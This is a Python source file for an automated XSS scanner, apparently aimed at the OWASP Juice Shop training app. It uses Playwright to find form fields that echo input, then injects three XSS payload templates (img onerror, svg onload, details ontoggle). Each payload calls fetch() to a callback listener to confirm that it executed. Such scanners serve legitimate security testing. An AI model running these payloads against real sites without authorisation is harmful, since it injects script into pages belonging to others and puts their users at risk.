"""Simplified XSS scanner that injects payloads into discovered forms."""

from __future__ import annotations

from dataclasses import dataclass
from enum import Enum, auto
from typing import Any, Dict, Iterable, Iterator, List, Optional, Set, Tuple

from playwright.sync_api import Browser, Locator, Page
from playwright.sync_api import TimeoutError as PlaywrightTimeoutError

from ...callback.server import register_payload, tracker
from ...core.models import FieldAttributes

PAYLOAD_TEMPLATES = (
    "<img src=x onerror=fetch('{url}')>",
    "<svg onload=fetch('{url}')>",
    "<details open ontoggle=fetch('{url}')>",
)
MARKER = "__owasp_scanner_echo__"
ECHO_TIMEOUT_MS = 5000
INJECTION_SETTLE_MS = 700
ECHO_SETTLE_MS = 300

OVERLAY_SELECTORS = (
    "button[aria-label='Close Welcome Banner']",
    ".cc-btn.cc-dismiss",
    "button[aria-label*='close']",
    ".cdk-overlay-backdrop",
    "mat-sidenav-container .mat-drawer-backdrop",
)

SEARCH_ICON_SELECTORS = (
    "mat-icon.mat-search_icon-search",
    ".mat-search_icons mat-icon:has-text('search')",
    "span.mat-search_icons mat-icon[class*='search']",
    "mat-icon:has-text('search'):not([class*='menu'])",
)


class EchoStatus(Enum):
    NOT_REFLECTED = auto()
    REFLECTED = auto()
    REFLECTED_FIELD_MISSING = auto()


@dataclass
class EchoResult:
    status: EchoStatus
    final_url: Optional[str] = None
    error: Optional[str] = None


@dataclass
class EchoFinding:
    url: str
    field_identifier: str
    metadata: FieldAttributes


class XSSScanner:
    def __init__(self, page: Page, browser: Browser, listener_url: str, origin_url: str, playwright_instance: Any):
        self.page = page
        self.browser = browser
        self.listener_url = listener_url.rstrip("/")
        self.origin_url = origin_url
        self.playwright = playwright_instance
        self.successful_echo_fields: List[EchoFinding] = []
        self._echo_seen: Set[Tuple[str, str, Optional[str], Optional[str], Optional[str]]] = set()
        self.injected_payloads: List[Dict[str, str]] = []

    def _safe_click(self, locator: Locator, *, timeout: int = 1500) -> bool:
        try:
            locator.click(timeout=timeout)
            return True
        except PlaywrightTimeoutError:
            return False
        except Exception:
            return False

    def _close_overlays(self) -> None:
        for selector in OVERLAY_SELECTORS:
            element = self.page.locator(selector).first
            if element.count() == 0:
                continue
            self._safe_click(element)

        try:
            self.page.keyboard.press("Escape")
        except Exception:
            pass

    def _activate_search_bar(self) -> None:
        search_input = self.page.locator("#mat-input-1")
        if search_input.count() > 0 and search_input.is_editable():
            return

        for selector in SEARCH_ICON_SELECTORS:
            icon = self.page.locator(selector).first
            if icon.count() == 0:
                continue
            if not self._safe_click(icon):
                continue
            try:
                search_input.wait_for(state="visible", timeout=2000)
            except Exception:
                continue
            if search_input.is_editable():
                return

    def _should_activate_search(self, metadata: FieldAttributes) -> bool:
        field_id = metadata.get("id")
        if isinstance(field_id, str) and field_id.lower() == "mat-input-1":
            return True

        tokens: list[str] = []
        for key in ("id", "name", "placeholder", "aria_label"):
            value = metadata.get(key)
            if isinstance(value, str):
                tokens.append(value.lower())

        if not tokens:
            return False

        return "search" in " ".join(tokens)

    def _ensure_field_ready(self, metadata: FieldAttributes) -> None:
        if metadata and self._should_activate_search(metadata):
            self._activate_search_bar()

    def _prepare_page(self, url: str) -> None:
        self.page.goto(url, timeout=8000, wait_until="domcontentloaded")
        self._close_overlays()

    def _normalize_attributes(self, raw: Any) -> FieldAttributes:
        attributes: FieldAttributes = {}
        if not isinstance(raw, dict):
            return attributes

        if "name" in raw:
            attributes["name"] = raw.get("name")
        if "id" in raw:
            attributes["id"] = raw.get("id")
        if "aria_label" in raw:
            attributes["aria_label"] = raw.get("aria_label")
        if "placeholder" in raw:
            attributes["placeholder"] = raw.get("placeholder")
        if "data_testid" in raw:
            attributes["data_testid"] = raw.get("data_testid")
        field_type = raw.get("type")
        if isinstance(field_type, str):
            attributes["type"] = field_type.lower()
        tag = raw.get("tag")
        if isinstance(tag, str):
            attributes["tag"] = tag.lower()
        return attributes

    def _copy_attributes(self, attrs: FieldAttributes) -> FieldAttributes:
        copied: FieldAttributes = {}
        for key, value in attrs.items():
            copied[key] = value
        return copied

    def _iter_fields(self, campos: Iterable[Any]) -> Iterator[Tuple[str, FieldAttributes]]:
        for field in campos:
            attributes: FieldAttributes = {}
            if isinstance(field, dict):
                identifier = field.get("identifier") or field.get("field")
                attributes = self._normalize_attributes(field.get("attributes") or {})
            else:
                identifier = str(field) if field else None
            if not identifier:
                continue
            yield identifier, attributes

    def _focus_field(self, locator) -> None:
        try:
            locator.wait_for(state="visible", timeout=2000)
        except Exception:
            pass
        try:
            locator.focus()
            return
        except Exception:
            pass
        self._safe_click(locator)

    def _enter_text(self, locator: Locator, text: str, *, typing_delay: float = 0.03) -> None:
        try:
            locator.fill("")
        except Exception:
            pass

        try:
            if typing_delay and typing_delay > 0:
                locator.type(text, delay=typing_delay)
            else:
                locator.type(text)
        except Exception:
            locator.fill(text)

        self._dispatch_input_events(locator)

    def _attempt_submit(self, locator: Locator) -> None:
        try:
            locator.press("Enter")
            return
        except Exception:
            pass

        try:
            self.page.keyboard.press("Enter")
            return
        except Exception:
            pass

        self._submit_via_form(locator)

    def _dispatch_input_events(self, locator) -> None:
        try:
            locator.evaluate(
                "el => { el.dispatchEvent(new Event('input', { bubbles: true }));"
                " el.dispatchEvent(new Event('change', { bubbles: true })); }"
            )
        except Exception:
            pass

    def _submit_via_form(self, locator) -> None:
        try:
            locator.evaluate(
                "el => { if (el.form) { el.form.requestSubmit ? el.form.requestSubmit() : el.form.submit(); } }"
            )
        except Exception:
            pass

    def _build_selector(self, field_identifier: str) -> str:
        attr = "name"
        value = field_identifier

        if "::" in field_identifier:
            prefix, value = field_identifier.split("::", 1)
            attr = {
                "id": "id",
                "aria": "aria-label",
                "placeholder": "placeholder",
                "data-testid": "data-testid",
            }.get(prefix, "name")

        escaped_value = value.replace("\\", "\\\\").replace('"', '\\"')
        return f"[{attr}=\"{escaped_value}\"]"

    def _escape_attr_value(self, value: str) -> str:
        return value.replace("\\", "\\\\").replace('"', '\\"')

    def _get_field_locator(self, field_identifier: str, metadata: FieldAttributes):
        placeholder = metadata.get("placeholder")
        if isinstance(placeholder, str) and placeholder:
            try:
                locator = self.page.get_by_placeholder(placeholder)
                if locator.count() > 0:
                    return locator
            except Exception:
                pass

        aria_label = metadata.get("aria_label")
        if isinstance(aria_label, str) and aria_label:
            try:
                locator = self.page.get_by_label(aria_label)
                if locator.count() > 0:
                    return locator
            except Exception:
                pass

        selectors: list[str] = []
        selectors.append(self._build_selector(field_identifier))

        if "::" in field_identifier:
            _, value = field_identifier.split("::", 1)
            selectors.append(f"[name=\"{self._escape_attr_value(value)}\"]")

        for attr_name, meta_key in (
            ("id", "id"),
            ("name", "name"),
            ("data-testid", "data_testid"),
            ("placeholder", "placeholder"),
            ("aria-label", "aria_label"),
        ):
            attr_value = metadata.get(meta_key)
            if isinstance(attr_value, str) and attr_value:
                selectors.append(f"[{attr_name}=\"{self._escape_attr_value(attr_value)}\"]")

        tag_name = metadata.get("tag")
        field_name = metadata.get("name")
        if isinstance(tag_name, str) and isinstance(field_name, str) and tag_name and field_name:
            selectors.append(
                f"{tag_name}[name=\"{self._escape_attr_value(field_name)}\"]"
            )

        seen: set[str] = set()
        fallback_locator = self.page.locator(selectors[0])
        for selector in selectors:
            if not selector or selector in seen:
                continue
            seen.add(selector)
            locator = self.page.locator(selector)
            try:
                if locator.count() > 0:
                    return locator
            except Exception:
                continue

        return fallback_locator

    def _apply_payload(
        self,
        field_identifier: str,
        payload_id: str,
        template_index: int,
        metadata: FieldAttributes,
    ) -> Dict[str, str]:
        payload = PAYLOAD_TEMPLATES[template_index].format(url=f"{self.listener_url}?id={payload_id}")
        self._ensure_field_ready(metadata)
        locator = self._get_field_locator(field_identifier, metadata)
        if locator.count() == 0:
            return {}

        input_field = locator.first
        self._focus_field(input_field)
        self._enter_text(input_field, payload)
        try:
            with self.page.expect_navigation(wait_until="domcontentloaded", timeout=ECHO_TIMEOUT_MS):
                self._attempt_submit(input_field)
        except PlaywrightTimeoutError:
            self._attempt_submit(input_field)

        try:
            self.page.wait_for_load_state("networkidle", timeout=1500)
        except PlaywrightTimeoutError:
            pass
        self.page.wait_for_timeout(250)

        if payload_id in tracker.injected:
            info = tracker.injected[payload_id]
            info.payload = payload
            field_id = metadata.get("id")
            field_name = metadata.get("name")
            if isinstance(field_id, str):
                info.field_id = field_id
            if isinstance(field_name, str):
                info.field_name = field_name

        field_id_value = metadata.get("id")
        if not isinstance(field_id_value, str):
            field_id_value = None

        field_name_value = metadata.get("name")
        if not isinstance(field_name_value, str):
            field_name_value = None

        return {
            "field": field_identifier,
            "field_id": field_id_value,
            "field_name": field_name_value or field_identifier,
            "payload_id": payload_id,
            "payload": payload,
        }

    def _field_still_present(self, field_identifier: str, metadata: FieldAttributes) -> bool:
        try:
            locator = self._get_field_locator(field_identifier, metadata)
            return locator.count() > 0
        except Exception:
            return False

    def _wait_for_marker(self) -> bool:
        try:
            self.page.wait_for_function(
                "marker => document.body && document.body.innerText.includes(marker)",
                arg=MARKER,
                timeout=ECHO_TIMEOUT_MS,
            )
            return True
        except PlaywrightTimeoutError:
            return False

    def _marker_in_dom(self) -> bool:
        try:
            return bool(
                self.page.evaluate(
                    "marker => document.documentElement && document.documentElement.outerHTML.includes(marker)",
                    MARKER,
                )
            )
        except Exception:
            return False

    def _marker_in_url(self) -> bool:
        try:
            return MARKER in self.page.url
        except Exception:
            return False

    def _marker_in_body_text(self) -> bool:
        try:
            page_text = self.page.locator("body").inner_text()
            return MARKER in page_text if page_text else False
        except Exception:
            return False

    def _marker_detected(self, origin_url: str, final_url: str) -> bool:
        if self._wait_for_marker():
            return True
        if self._marker_in_dom():
            return True
        if self._marker_in_url():
            return True
        if final_url != origin_url and self._marker_in_body_text():
            return True
        return False

    def _register_echo_finding(self, final_url: str, field_identifier: str, metadata: FieldAttributes) -> None:
        key = (
            final_url,
            field_identifier,
            metadata.get("id"),
            metadata.get("name"),
            metadata.get("placeholder"),
        )
        if key in self._echo_seen:
            return

        self._echo_seen.add(key)
        self.successful_echo_fields.append(
            EchoFinding(
                url=final_url,
                field_identifier=field_identifier,
                metadata=self._copy_attributes(metadata),
            )
        )

    def _echo_test(self, url: str, field_identifier: str, metadata: FieldAttributes) -> EchoResult:
        self._prepare_page(url)
        self._ensure_field_ready(metadata)
        locator = self._get_field_locator(field_identifier, metadata)
        if locator.count() == 0:
            return EchoResult(EchoStatus.NOT_REFLECTED, error="field_not_found")
        input_field = locator.first
        self._focus_field(input_field)
        self._enter_text(input_field, MARKER)
        navigation_url: Optional[str] = None
        try:
            with self.page.expect_navigation(wait_until="domcontentloaded", timeout=ECHO_TIMEOUT_MS) as navigation:
                self._attempt_submit(input_field)
            navigation_url = navigation.value.url if navigation.value else None
        except PlaywrightTimeoutError:
            self._attempt_submit(input_field)
        except Exception:
            pass

        try:
            self.page.wait_for_load_state("networkidle", timeout=1500)
        except PlaywrightTimeoutError:
            pass
        self.page.wait_for_timeout(ECHO_SETTLE_MS)
        final_url = navigation_url or self.page.url

        if not self._marker_detected(url, final_url):
            return EchoResult(EchoStatus.NOT_REFLECTED)

        if not self._field_still_present(field_identifier, metadata):
            return EchoResult(EchoStatus.REFLECTED_FIELD_MISSING, final_url=final_url)

        return EchoResult(EchoStatus.REFLECTED, final_url=final_url)

    def run(self, form_targets: List[Dict[str, Any]]) -> List[Dict[str, str]]:
        for form in form_targets:
            url = form.get("url_de_envio")
            campos = form.get("campos", [])
            if not url or not campos:
                continue
            campos_list = list(campos)
            print(f"   [eco] Avaliando {len(campos_list)} campo(s) em {url}")
            for field_identifier, metadata in self._iter_fields(campos_list):
                print(f"   [eco] -> Testando campo '{field_identifier}'")
                try:
                    echo_result = self._echo_test(url, field_identifier, metadata)
                except Exception as exc:
                    print(f"   [eco] ! Erro ao testar '{field_identifier}': {exc}")
                    continue

                if echo_result.status is EchoStatus.REFLECTED and echo_result.final_url:
                    self._register_echo_finding(echo_result.final_url, field_identifier, metadata)
                    print(
                        f"   [eco] <- Refletiu como '{field_identifier}' em {echo_result.final_url}"
                    )
                elif echo_result.status is EchoStatus.REFLECTED_FIELD_MISSING:
                    print(
                        f"   [eco] ~ Reflexão detectada em '{field_identifier}', mas o campo não existe na página final; ignorando."
                    )
                else:
                    print(f"   [eco] X Sem reflexão para '{field_identifier}'")

        if not self.successful_echo_fields:
            return []

        for finding in self.successful_echo_fields:
            print(f"   [injeção] Preparando '{finding.field_identifier}' em {finding.url}")
            self._prepare_page(finding.url)
            self._ensure_field_ready(finding.metadata)
            for index, _ in enumerate(PAYLOAD_TEMPLATES):
                field_id = (
                    finding.metadata.get("id") if isinstance(finding.metadata.get("id"), str) else None
                )
                field_name_attr = finding.metadata.get("name")
                field_name = (
                    field_name_attr if isinstance(field_name_attr, str) else finding.field_identifier
                )

                payload_id = register_payload(field_id, field_name, "", finding.url)
                try:
                    record = self._apply_payload(
                        finding.field_identifier,
                        payload_id,
                        index,
                        finding.metadata,
                    )
                    if record:
                        self.injected_payloads.append(record)
                        print(
                            f"   [injeção] Payload {payload_id} (template {index}) enviado ao campo '{finding.field_identifier}'"
                        )
                    self.page.wait_for_timeout(INJECTION_SETTLE_MS)
                except Exception as exc:
                    print(
                        f"   [injeção] ! Falha ao injetar no campo '{finding.field_identifier}': {exc}"
                    )
                    continue

        return self.injected_payloads
